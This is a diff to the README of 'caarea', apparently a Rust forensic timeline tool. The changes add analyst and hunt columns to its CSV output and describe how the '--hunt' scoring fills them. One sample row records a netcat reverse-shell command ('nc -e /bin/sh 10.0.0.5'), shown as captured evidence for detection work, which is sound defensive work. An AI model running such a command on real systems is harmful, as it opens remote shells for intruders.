@@ -21,7 +21,7 @@ Written in Rust. One static binary for Windows, Linux and macOS. No mounting, no
 - **Gets the time right.** Every timestamp is converted to UTC. Linux logs that only carry wall-clock time (classic syslog, `dpkg.log`, `ps`) are corrected with the host's own time zone, found in the evidence (`/etc/timezone`, `/etc/localtime`, `timedatectl`).
 - **Tells you where a row came from.** Events that only exist in a shadow copy are tagged with the snapshot time; a live event and its snapshot twin are not shown twice. The same vocabulary will mark rows recovered from freed structures and from carving.
 - **Recovers what was deleted.** Freed registry cells and unused `$MFT` records are read by default; `--carve` scans the raw bytes of images, live volumes and pagefiles for hives, event log chunks, MFT and journal records and Prefetch files that no file system points to any more.
-- **Hunts when you ask.** `--hunt` rebuilds the process tree of every host and marks what contradicts the documented boot and logon tree, the parents that never create shells, dead creators and Linux service accounts opening shells, each with a score, the ATT&CK technique and the lineage. Findings go to their own CSV; the timeline stays as it is.
+- **Hunts when you ask.** `--hunt` rebuilds the process tree of every host and marks what contradicts the documented boot and logon tree, the parents that never create shells, dead creators and Linux service accounts opening shells, each with a score, the ATT&CK technique and the lineage. The verdict lands in the same five tail columns masstin uses; the detailed findings in their own table.
 - **Treats evidence as hostile.** Archives are unpacked into an isolated, per-run temporary folder; entries cannot escape it, symlinks are never followed, and packages with the same file name from different hosts never overwrite each other. The evidence itself is only ever read.
 
 ---
@@ -48,7 +48,7 @@ Add `-m evtx`, `-m registry`, `-m windows` (Prefetch and the other Windows file 
 
 ## What comes out
 
-An RFC 4180 CSV with ten columns. Timestamps are UTC with a fixed width (`YYYY-MM-DDTHH:MM:SS.ffffffZ`), so sorting the text sorts the time.
+An RFC 4180 CSV with fifteen columns: ten that describe the event, written by the parsers, and an analysis tail of five that the parsers leave empty and that `--hunt` and the analyst fill. The tail is the one that closes [masstin](https://github.com/jupyterj0nes/masstin)'s timeline (`hunt`, `hunt_score`, `hunt_why`, `verdict`, `notes`), so a case tool maps it once for both. Timestamps are UTC with a fixed width (`YYYY-MM-DDTHH:MM:SS.ffffffZ`), so sorting the text sorts the time.
 
 | Column | Meaning |
 | :--- | :--- |
@@ -62,12 +62,17 @@ An RFC 4180 CSV with ten columns. Timestamps are UTC with a fixed width (`YYYY-M
 | `processname` | Binary, script, task or package |
 | `commandline` | Full command line or the details of the artifact |
 | `parentprocessname` | Parent process or launching component. When the source only gave a PID (auditd, `pacct`, 4688 before Windows 10) and the creator's own row is in the timeline, the name is filled in as `/usr/bin/sudo (PID: 12493)` |
+| `hunt` | What `--hunt` made of the row: `malicious` (best rule at 85 or more), `suspicious` (60 to 84), `review` (below 60), `anomalous` (a statistical test, from phase H4), `baseline` (reference, not judged), or empty |
+| `hunt_score` | How much the row deserves reading, an integer from 0 to 100, filterable: `hunt_score >= 60` keeps `suspicious` and worse. From a rule it is the rule's score; from a statistical test (phase H4) it is masstin's rarity scale, `-10 · log10(q)` (13 is one in twenty, 30 one in a thousand, 60 one in a million), and a row with both takes the larger. masstin's number measures rarity only; CAAREA's measures how much the row deserves reading. Empty when nothing judged the row |
+| `hunt_why` | Why, in words: every rule that fired, highest score first (the score of the others in brackets), then the lineage. `GEN-OFFICE-SHELL winword.exe launched cmd.exe [T1566.001]; GEN-PARENT-GONE creator had exited [T1134.004] (score 55); lineage: explorer.exe > WINWORD.EXE > cmd.exe` |
+| `verdict` | The analyst's: `suspicious`, `confirmed`, `benign`, or empty. Never written by CAAREA |
+| `notes` | The analyst's free text |
 
-Two real rows:
+Two real rows (the empty tail is written bare, `,,,,,`, as masstin writes it):
 
 ```csv
-"2016-09-21T03:41:02.560546Z","IE10Win7","evtx:4688",4688,488,"WORKGROUP\IE10WIN7$","","C:\Windows\duKhLYUX.exe","C:\Windows\duKhLYUX.exe","C:\Windows\System32\services.exe"
-"2025-09-26T00:01:40.243000Z","victim01","linux:audit:execve",0,3538,"1000","1000","/usr/bin/nc","nc -e /bin/sh 10.0.0.5 (CWD: /tmp)","PID: 2686"
+"2016-09-21T03:41:02.560546Z","IE10Win7","evtx:4688",4688,488,"WORKGROUP\IE10WIN7$","","C:\Windows\duKhLYUX.exe","C:\Windows\duKhLYUX.exe","C:\Windows\System32\services.exe",,,,,
+"2025-09-26T00:01:40.243000Z","victim01","linux:audit:execve",0,3538,"1000","1000","/usr/bin/nc","nc -e /bin/sh 10.0.0.5 (CWD: /tmp)","PID: 2686",,,,,
 ```
 
 ---
@@ -162,7 +167,7 @@ The scanner, the guarded sources and the structural validators are the [blockcar
 
 ## Process hunting, when you ask for it
 
-`--hunt` runs a set of rules over the finished timeline and writes the hits to a second CSV next to it (`host.hunt.csv`, or `--hunt-output`). The timeline itself does not change: ten columns, same rows. Each finding carries a score (0 to 100), the ATT&CK technique, the lineage of the process and one sentence saying why it matters.
+`--hunt` runs a set of rules over the finished timeline and writes what it made of each row into the row's analysis tail: `hunt` takes the word of the best rule (`malicious`, `suspicious`, `review`), `hunt_score` its score, `hunt_why` lists every rule that fired and the lineage. The ten event columns do not change, and `verdict` / `notes`, the analyst's columns, are never written. The detailed findings go to a second CSV next to the timeline (`host.hunt.csv`, or `--hunt-output`), one row per rule hit, ranked by score: `rank, significant, p_value, q_value, score, signature, mitre, title, time_created, computer, pid, processname, commandline, parentprocessname, subject_username, artifact, lineage, why_unusual, evidence`. The first four and the last two columns are the ones masstin's and allymacb's hunt tables use; `significant` is `yes` from `suspicious` up; `why_unusual` is one sentence saying why the row matters; `evidence` names the rows it was correlated with.
 
 ```bash
 caarea -f workstation.E01 -o workstation.csv --hunt
@@ -238,7 +243,7 @@ caarea [OPTIONS] --output <PATH>
 
 ## How it is tested
 
-`cargo test` runs 133 tests. They include real-layout records for every binary format, real auditd lines, the public TZif files of two zones, and safety tests that try to break out of the staging folder.
+`cargo test` runs 136 tests. They include real-layout records for every binary format, real auditd lines, the public TZif files of two zones, and safety tests that try to break out of the staging folder.
 
 Beyond the unit tests, the parsers were checked against:
 
